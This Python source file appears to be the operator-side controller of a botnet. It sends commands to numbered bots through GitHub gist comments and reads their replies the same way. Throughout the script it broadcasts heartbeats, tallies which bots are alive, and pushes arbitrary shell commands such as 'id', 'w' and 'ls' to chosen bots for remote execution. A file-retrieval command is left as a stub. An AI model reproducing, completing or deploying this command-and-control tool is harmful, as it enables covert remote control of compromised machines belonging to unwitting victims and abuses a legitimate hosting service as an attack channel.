import argparse
import time
import utils
from utils import Command

REFRESH_DELAY = 360  # 6 minutes

LAST_COMMENT = 0


# TODO: better message
def error():
    print("Bad input")


def heartbeat():
    while True:
        send_heartbeat()
        time.sleep(REFRESH_DELAY)
        check_bots()


def send_heartbeat():
    return send_command(utils.BROADCAST, Command.HEARTBEAT, "", True)


def check_bots():
    global LAST_COMMENT
    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)

    alive = set()
    for comment in data:
        bot, d = parse_response(comment['body'])
        alive.add(bot)
        show_response(bot, d)
    
    print(" >>> ALIVE: " + str(len(alive)) + '\n')
    return alive


# TODO rework
# TODO: check if parsable
def parse_response(comment):
    s = comment.find('\n')
    bot = int(comment[:s])
    data = comment[s+1:]
    return bot, data


def show_response(bot, data):
    print(str(bot) + ':\n' + data + '\n')


def send_command(bot, cmd, data, respond):
    comment = parse_command(bot, cmd, data, respond)
    return utils.post_gist_comment(comment)


# TODO rework
def parse_command(bot, cmd, data, respond):
    return str(bot) + '\n' + cmd.name + '\n' + data + '\n' + str(int(respond)) + '\n'


def request_file(bot, filepath, respond):
    # TODO
    return


def handle_input(args):
    if args.command == 'heartbeat' or args.command == 'hb':
        return heartbeat()

    if args.bot <= 0: return error()
    respond = not args.silent

    if args.command == 'cmd' or args.command == 'exec':
        if (args.data == ''): return error()
        return send_command(args.bot, Command.CMD, args.data, respond)

    elif args.command == 'w':
        return send_command(args.bot, Command.CMD, 'w', respond)

    elif args.command == 'ls':
        if (args.data == ''): return error()
        return send_command(args.bot, Command.CMD, 'ls ' + args.data, respond)

    elif args.command == 'id':
        return send_command(args.bot, Command.CMD, 'id', respond)

    elif args.command == 'req_file' or args.command == 'rf':
        if (args.data == ''): return error()
        return request_file(args.bot, args.data, respond)


if __name__ == "__main__":
    utils.init_config()

    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=[
            'heartbeat', 'hb',
            'cmd', 'exec',
            'w', 'ls', 'id',
            'req_file', 'rf',
        ])
    parser.add_argument('-d', '--data', default='')
    parser.add_argument('-b', '--bot', default=0, type=int)
    parser.add_argument('-s', '--silent', action='store_true')

    args = parser.parse_args()
    handle_input(args)
